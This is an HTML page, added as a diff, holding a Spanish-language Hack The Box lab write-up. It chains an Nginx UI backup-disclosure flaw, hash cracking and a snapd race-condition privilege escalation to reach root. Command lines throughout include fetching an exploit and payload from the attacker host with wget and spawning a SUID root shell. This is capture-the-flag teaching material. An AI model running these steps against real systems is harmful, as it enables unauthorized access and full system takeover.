@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Snapped (Hard) — Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0d10;
+            color: #e4e7ec;
+            line-height: 1.7;
+            padding: 2rem 1.5rem;
+        }
+
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: #13171c;
+            border-radius: 32px;
+            padding: 2.5rem 2.8rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
+            border: 1px solid #282e36;
+        }
+
+        .banner {
+            width: 100%;
+            border-radius: 20px;
+            margin-bottom: 2.2rem;
+            border: 1px solid #282e36;
+            display: block;
+        }
+
+        h1 {
+            font-size: 2.6rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #b7b7ff, #7aa9ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+        }
+
+        .subhead {
+            color: #9aa4b3;
+            font-size: 1.05rem;
+            border-left: 4px solid #3b82f6;
+            padding-left: 1.2rem;
+            margin-bottom: 2.5rem;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #1e293b;
+            color: #b9c7dc;
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 0.2rem 0.9rem;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+            margin-right: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-top: 2.8rem;
+            margin-bottom: 1.2rem;
+            color: #e4e7ec;
+            border-bottom: 1px solid #282e36;
+            padding-bottom: 0.4rem;
+        }
+
+        h3 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-top: 2rem;
+            margin-bottom: 0.6rem;
+            color: #cbd5e1;
+        }
+
+        p {
+            margin-bottom: 1.2rem;
+            color: #cdd5e0;
+        }
+
+        ul,
+        ol {
+            margin: 0.8rem 0 1.5rem 1.8rem;
+            color: #cdd5e0;
+        }
+
+        li {
+            margin-bottom: 0.4rem;
+        }
+
+        code {
+            background: #1a2027;
+            color: #f0c96b;
+            padding: 0.2rem 0.5rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        pre {
+            background: #0d1117;
+            border: 1px solid #282e36;
+            border-radius: 16px;
+            padding: 1.2rem 1.5rem;
+            overflow-x: auto;
+            font-size: 0.85rem;
+            font-family: 'JetBrains Mono', monospace;
+            color: #d4dcec;
+            margin: 1.2rem 0 2rem 0;
+        }
+
+        pre .cmd {
+            color: #7ecb8e;
+        }
+        pre .user {
+            color: #b392f0;
+        }
+        pre .path {
+            color: #7aa9ff;
+        }
+        pre .out {
+            color: #b9c7dc;
+        }
+
+        .footnote {
+            background: #1a2027;
+            border-left: 4px solid #3b82f6;
+            padding: 0.8rem 1.4rem;
+            border-radius: 12px;
+            margin: 1.8rem 0;
+            font-size: 0.95rem;
+            color: #b9c7dc;
+        }
+
+        .footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid #282e36;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #7aa9ff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .footer a:hover {
+            color: #b7b7ff;
+            text-decoration: underline;
+        }
+
+        .dev-sign {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #1e293b;
+            padding: 0.6rem 1.8rem;
+            border-radius: 60px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            transition: 0.25s ease;
+            border: 1px solid #2d3748;
+            margin-top: 0.5rem;
+        }
+
+        .dev-sign:hover {
+            background: #2d3748;
+            border-color: #3b82f6;
+            transform: scale(1.02);
+        }
+
+        .dev-sign .emoji {
+            font-size: 1.3rem;
+        }
+
+        .flag-placeholder {
+            background: #1a2027;
+            color: #f0c96b;
+            padding: 0.2rem 0.8rem;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 700px) {
+            .container {
+                padding: 1.2rem 1.2rem;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+            pre {
+                font-size: 0.75rem;
+                padding: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== BANNER ===== -->
+    <img src="snapped.png" alt="HTB Snapped Banner" class="banner" />
+
+    <!-- ===== TÍTULO ===== -->
+    <h1>HTB Snapped · Hard</h1>
+    <div class="subhead">
+        <span class="badge">Linux</span>
+        <span class="badge">CVE-2026-27944</span>
+        <span class="badge">CVE-2026-3888</span>
+        <span class="badge">SUID LPE</span>
+        <span style="display:block; margin-top:0.4rem;">
+            De backup filtrado a root via race condition en snapd
+        </span>
+    </div>
+
+    <!-- ===== INTRO ===== -->
+    <p>
+        <strong>Snapped</strong> es una máquina <strong>Hard</strong> de Hack The Box que encadena
+        dos vulnerabilidades reales para obtener acceso y escalar a root.
+        El foothold explota <strong>CVE-2026-27944</strong> en Nginx UI,
+        que expone el endpoint <code>/api/backup</code> sin autenticación
+        y filtra la clave de cifrado en los headers.
+        La escalada aprovecha <strong>CVE-2026-3888</strong>,
+        una race condition TOCTOU entre <code>snap-confine</code> (SUID root)
+        y <code>systemd-tmpfiles</code>, que permite secuestrar el linker dinámico
+        y obtener una shell root.
+    </p>
+
+    <!-- ===== RECON ===== -->
+    <h2>🕵️ Reconocimiento</h2>
+    <h3>Escaneo de puertos</h3>
+    <pre><span class="cmd">nmap -sCV</span> <span class="path">10.129.70.42</span>
+<span class="out">22/tcp  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp  http    nginx 1.24.0 (Ubuntu)</span></pre>
+
+    <h3>Subdominio</h3>
+    <pre><span class="cmd">ffuf -u http://10.129.70.42 -H 'Host: FUZZ.snapped.htb' \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span>
+<span class="out">admin                   [Status: 200]</span></pre>
+    <p>Se agrega el subdominio al <code>/etc/hosts</code>:</p>
+    <pre><span class="cmd">echo "10.129.70.42 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts</span></pre>
+
+    <!-- ===== FOOTHOLD ===== -->
+    <h2>🔓 Foothold — CVE-2026-27944</h2>
+    <p>
+        El panel <code>admin.snapped.htb</code> ejecuta Nginx UI vulnerable.
+        El endpoint <code>/api/backup</code> devuelve un backup completo
+        y en el header <code>X-Backup-Security</code> se filtra la clave AES.
+    </p>
+
+    <h3>Descarga del backup</h3>
+    <pre><span class="cmd">curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 \
+  | grep -i "X-Backup-Security"</span>
+<span class="out">< X-Backup-Security: <span style="color:#f0c96b;">KEY=... IV=...</span></span></pre>
+
+    <h3>Descifrado del archivo</h3>
+    <pre><span class="cmd">KEY_HEX=$(echo "$KEY" | base64 -d | xxd -p -c 256)
+IV_HEX=$(echo "$IV" | base64 -d | xxd -p -c 256)
+openssl enc -d -aes-256-cbc -K $KEY_HEX -iv $IV_HEX -nopad \
+  -in nginx-ui.zip -out nginx-ui-decrypted.zip
+unzip nginx-ui-decrypted.zip</span></pre>
+
+    <h3>Extracción del hash bcrypt</h3>
+    <pre><span class="cmd">strings database.db | grep '\$2a\$'</span>
+<span class="out">$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq</span></pre>
+
+    <p>El hash corresponde al usuario <strong>jonathan</strong>. Se crackea con <code>hashcat</code>.</p>
+    <pre><span class="cmd">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force</span></pre>
+
+    <h3>Acceso SSH</h3>
+    <pre><span class="cmd">ssh jonathan@snapped.htb</span>
+<span class="out">Welcome to Ubuntu 24.04.4 LTS</span></pre>
+
+    <div class="footnote">
+        ✅ <strong>Flag de usuario</strong> obtenida. El archivo <code>user.txt</code>
+        se encuentra en el home de jonathan.
+    </div>
+
+    <!-- ===== PRIVESC ===== -->
+    <h2>🚀 Escalada de privilegios — CVE-2026-3888</h2>
+    <p>
+        <strong>CVE-2026-3888</strong> es una race condition TOCTOU
+        entre <code>snap-confine</code> (SUID root) y <code>systemd-tmpfiles</code>.
+        El exploit abusa de la ventana temporal en la que <code>systemd-tmpfiles</code>
+        borra <code>/tmp/.snap</code> y la recrea con contenido malicioso.
+    </p>
+
+    <h3>Compilación del exploit (SUID variant)</h3>
+    <pre><span class="cmd">gcc -O2 -static -o exploit exploit_suid.c
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c</span></pre>
+
+    <h3>Transferencia al target</h3>
+    <pre><span class="cmd"># Máquina atacante
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.15.237:8080/exploit -O ~/exploit
+wget http://10.10.15.237:8080/librootshell.so -O ~/librootshell.so
+chmod +x ~/exploit ~/librootshell.so</span></pre>
+
+    <h3>Ejecución del exploit</h3>
+    <p>El exploit se ejecuta en el momento exacto en que <code>systemd-tmpfiles</code>
+    borra <code>/tmp/.snap</code>:</p>
+    <pre><span class="cmd">~/exploit ~/librootshell.so -d</span>
+<span class="out">[+] Inner shell PID: 14715
+[+] .snap already gone!
+[!] TRIGGER — swapping directories...
+[+] SWAP DONE — race won!
+[+] Poisoned namespace PID: 14895
+[+] Payload injected.
+[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)</span></pre>
+
+    <h3>Shell root</h3>
+    <pre><span class="cmd">/var/snap/firefox/common/bash -p</span>
+<span class="out">bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt</span></pre>
+
+    <div class="footnote">
+        🏴‍☠️ <strong>Flag de root</strong> obtenida. Escalada exitosa mediante
+        hijacking del linker dinámico dentro del namespace de snapd.
+    </div>
+
+    <!-- ===== REFERENCIAS ===== -->
+    <h2>📚 Referencias</h2>
+    <ul>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27944" target="_blank">CVE-2026-27944 — Nginx UI Backup Disclosure</a></li>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3888" target="_blank">CVE-2026-3888 — snapd TOCTOU LPE</a></li>
+        <li><a href="https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE" target="_blank">Exploit SUID · TheCyberGeek</a></li>
+        <li><a href="https://0xdf.gitlab.io/htb-snapped" target="_blank">Writeup de referencia · 0xdf</a></li>
+    </ul>
+
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">
+        <p style="color:#9aa4b3; font-size:0.9rem;">
+            Escrito con fines educativos · Todos los comandos y técnicas
+            se ejecutaron en entornos autorizados.
+        </p>
+        <a href="https://github.com/tuusuario/snapped-writeup" target="_blank" style="color:#7aa9ff; font-weight:500;">
+            📂 Ver repositorio completo
+        </a>
+        <br /><br />
+        <a href="https://tu-portafolio.dev" target="_blank" class="dev-sign">
+            <span class="emoji">🧑‍💻</span>
+            Desarrollado por <strong>Tu Nombre</strong>
+            <span style="font-size:0.8rem; color:#9aa4b3; margin-left:6px;">→ CV</span>
+        </a>
+    </div>
+
+</div>
+
+</body>
+</html>
